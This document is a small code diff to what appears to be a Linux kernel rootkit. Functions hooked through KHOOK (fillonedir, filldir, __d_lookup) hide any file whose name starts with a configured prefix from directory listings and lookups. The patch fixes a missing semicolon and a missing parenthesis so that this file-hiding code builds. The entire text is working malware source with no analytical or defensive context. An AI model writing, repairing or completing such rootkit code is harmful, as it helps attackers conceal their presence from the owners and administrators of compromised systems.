@@ -125,7 +125,7 @@ static bool should_hide_file(const char *name) {
     if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
         return true;
     }
-    return false
+    return false;
 }
 
 KHOOK_EXT(int, fillonedir, void *, const char *, int, loff_t, u64, unsigned int);
@@ -170,7 +170,7 @@ static int khook_compat_filldir(void *__buf, const char *name, int namlen, loff_
 
 KHOOK_EXT(struct dentry *, __d_lookup, const struct dentry *, const struct qstr *);
 struct dentry *khook___d_lookup(const struct dentry *parent, const struct qstr *name) {
-    if (should_hide_file(name->name) {
+    if (should_hide_file(name->name)) {
         return NULL;
 	}
     return KHOOK_ORIGIN(__d_lookup, parent, name);
